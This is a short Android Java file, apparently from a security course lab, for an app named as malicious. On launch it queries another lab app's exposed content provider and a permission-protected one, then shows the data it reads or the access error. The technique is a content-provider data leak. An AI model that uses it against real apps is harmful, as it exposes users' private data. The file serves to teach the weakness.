package and402lab3.nhut.and402.lab.and402lab3_malicious_app;

import android.database.Cursor;
import android.net.Uri;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.widget.TextView;

public class MainActivity extends AppCompatActivity {
    private Uri dataUri = Uri.parse("content://and402lab3.nhut.and402.lab.and402lab3_exposedcontentprovider");
    private Uri secureDataUri = Uri.parse("content://and402.lab.and402lab3_protectedcontentprovider");

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        TextView content = (TextView) findViewById(R.id.content);
        Cursor c = getContentResolver().query(dataUri, null, null, null, null);
        if (c.moveToFirst())
            content.setText("Read from normal content provider : " + c.getString(1));
        try {
            Cursor cS = getContentResolver().query(secureDataUri, null, null, null, null);
            if (cS.moveToFirst())
                content.append("\nRead from secured content provider : " + cS.getString(1));
        } catch (Exception e) {
            content.append("Read from secured content provider : " + "error : " + e.getMessage());
        }
    }
}